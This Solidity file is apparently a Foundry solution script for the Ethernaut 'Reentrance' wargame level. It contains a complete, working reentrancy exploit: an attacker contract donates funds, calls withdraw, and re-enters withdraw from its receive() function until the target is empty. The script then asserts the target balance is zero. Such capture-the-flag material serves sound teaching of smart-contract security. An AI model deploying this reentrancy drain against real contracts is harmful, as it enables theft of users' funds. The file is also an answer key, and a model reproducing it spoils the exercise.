// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {EthernautScript} from "src/common/EthernautScript.sol";
import {Reentrance} from "./Problem.sol";

contract Solution {
    function drainIt(Reentrance _reentrance) external payable {
        _reentrance.donate{value: msg.value}(address(this));
        uint256 donation = _reentrance.balanceOf(address(this));
        require(donation > 0, "No donation was made");
        _reentrance.withdraw(donation);
        uint256 balanceOfAfter = _reentrance.balanceOf(address(this));
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        uint256 remainingContractBalance = msg.sender.balance;
        uint256 donation = Reentrance(msg.sender).balanceOf(address(this));
        if (remainingContractBalance > 0) {
            uint256 withdrawal = _min(donation, remainingContractBalance);
            Reentrance(msg.sender).withdraw(withdrawal);
        }
    }

    function _min(uint256 _a, uint256 _b) internal pure returns (uint256) {
        return _a > _b ? _b : _a;
    }
}

contract SolutionScript is EthernautScript {
    function solve(address payable _instanceAddress) internal override {
        uint256 contractBalaceBefore = _instanceAddress.balance;
        uint256 myBalanceBefore = tx.origin.balance;
        Reentrance reentrance = Reentrance(_instanceAddress);

        vm.startBroadcast();
        Solution solution = new Solution();
        solution.drainIt{value: contractBalaceBefore}(reentrance);
        vm.stopBroadcast();

        uint256 myBalanceAfter = tx.origin.balance;
        uint256 contractBalaceAfter = _instanceAddress.balance;

        assert(myBalanceAfter > myBalanceBefore);
        assert(contractBalaceAfter == 0);
    }

    function getLevelAddress() internal view override returns (address) {
        return _getContractAddress("10");
    }

    function getCreationValue() internal view override returns (uint256) {
        return 0.001 ether;
    }
}
